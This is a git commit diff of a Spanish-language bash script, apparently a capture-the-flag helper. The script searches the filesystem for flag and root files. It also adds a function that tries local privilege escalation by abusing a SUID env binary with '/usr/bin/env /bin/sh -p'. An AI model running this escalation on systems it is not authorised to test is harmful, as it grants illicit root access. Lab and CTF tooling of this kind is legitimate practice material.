51521b6f10ba5b8889ce354c428bf50292025b57
Ruben Gomez <santiagogomezgarro@gmail.com>
2023-05-11 20:31:57 -0600

    Update

--- script.sh
+++ script.sh
@@ -23,27 +23,43 @@ capabilities() {
 }
 
 flagsearch(){
+    tput cnorm; echo -ne "\nQuieres buscar flag.txt? [S/N]: " && read op
+    if [ "$op" == "s" ] || [ "$op" == "S" ]; then
+        tput civis
+        echo -e "\nBuscando flags.txt..."
+        echo -e "======================\n"
+        search=$(find / -name "flag*.txt" 2>/dev/null)
+        echo -e "$search"
+        
+        echo -e "\nBuscando flags roots..."
+        echo -e "========================\n"
+        root=$(find / -name "root.txt" 2>/dev/null)
+        echo -e "$root"
+        for num in {1..3}; do
+            find / -name "root${num}.txt" > /dev/null 2>&1
+            if [ "$(echo $?)" -eq 0 ]; then
+                echo -e "$(find / -name "root${num}.txt" 2>/dev/null)"
+            fi
+        done
+    fi
 
-    echo -e "\nBuscando flags.txt..."
-    echo -e "======================\n"
-    search=$(find / -name "flag*.txt" 2>/dev/null)
-    echo -e "$search"
+}
+
+env(){
+    echo -e "\nIntentando ser root con env..."
+    echo -e "==============================\n"
+    /usr/bin/env /bin/sh -p 2>/dev/null
+    if [ $(id -u) -ne 0 ]; then
+        echo -e "No se pudo"
+    else 
+        echo -e "Se encontro una vulnerabilidad, ejecuta este comando cuando salgas del script -> /usr/bin/env /bin/sh -p"
+    fi
     
-    echo -e "\nBuscando flags roots..."
-    echo -e "========================\n"
-    root=$(find / -name "root.txt" 2>/dev/null)
-    echo -e "$root"
-    for num in {1..3}; do
-        find / -name "root${num}.txt" > /dev/null 2>&1
-        if [ "$(echo $?)" -eq 0 ]; then
-            echo -e "$(find / -name "root${num}.txt" 2>/dev/null)"
-        fi
-    done
-
 }
 
 clear; tput civis
 permisos_suid
 capabilities
+env
 flagsearch
 tput cnorm
